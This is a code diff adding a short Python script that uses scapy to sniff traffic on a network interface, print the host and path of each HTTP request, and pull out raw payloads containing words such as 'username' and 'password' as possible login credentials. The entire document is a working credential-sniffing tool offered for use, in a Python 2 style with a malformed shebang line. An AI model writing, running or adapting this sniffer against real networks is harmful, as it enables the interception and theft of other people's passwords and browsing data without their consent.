@@ -1,1 +1,26 @@
 #/usr/bin/env python
+import scapy.all as scapy
+from scapy.layers import http
+
+def sniff(interface, process_packet):
+    scapy.sniff(iface=interface, store=False, prn=process_packet)
+
+def get_url(packet):
+    print("[+] HTTP Request Host >> " + packet[http.HTTPRequest].Host )
+    print("[+] HTTP Request Path >> " + packet[http.HTTPRequest].Path)
+
+def get_login_info(packet):
+    if packet.haslayer(scapy.Raw):
+        load = packet[scapy.Raw].load
+        keywords = ["username", "user", "password", "login", "pass"]
+        for keyword in keywords:
+            if keyword in load:
+                return load
+    return None
+
+def process_sniffed_packet(packet):
+    if packet.haslayer(http.HTTPRequest):
+        get_url(packet)
+        login_info = get_login_info(packet)
+        if login_info:
+            print("[+] Possible username/password >> " + login_info)
